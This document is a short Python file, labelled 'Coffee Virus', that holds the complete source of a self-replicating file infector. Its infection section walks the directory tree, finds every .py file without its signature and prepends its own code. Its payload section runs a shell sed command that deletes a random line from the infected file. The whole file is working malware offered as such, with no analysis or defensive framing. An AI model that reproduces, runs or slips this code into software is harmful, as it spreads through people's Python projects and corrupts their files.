##INFECTION
s="-=-Coffee Virus-=-" #signature for infection identification
import os,fnmatch

path = (os.path.abspath(__file__)).strip(str(__file__))	#find path of file being executed
v=open(__file__,"r").readlines()[:13]	                  #read in virus source

for root,dirs,files in os.walk(path):	      #read all the files and directories
	for f in fnmatch.filter(files,"*.py"):	  #search for ".py" files

		p = open((os.path.abspath(os.path.join(root,f))),"r+").readlines()	#open potential host for virus
		if not p[0].startswith("s=\"-=-Coffee Virus-=-\""):			            #check for previous infection
			open((os.path.abspath(os.path.join(root,f))),"r+").writelines(v+["\n"]+p)	#load in original file contents with virus
																						                                    #source

##PAYLOAD
cmd="sed -i $((13 + RANDOM % {}))d {}".format(len(v),str(__file__))	  #delete random line from infected file	
os.popen(cmd,"r",1)													                          #while keeping virus code intact
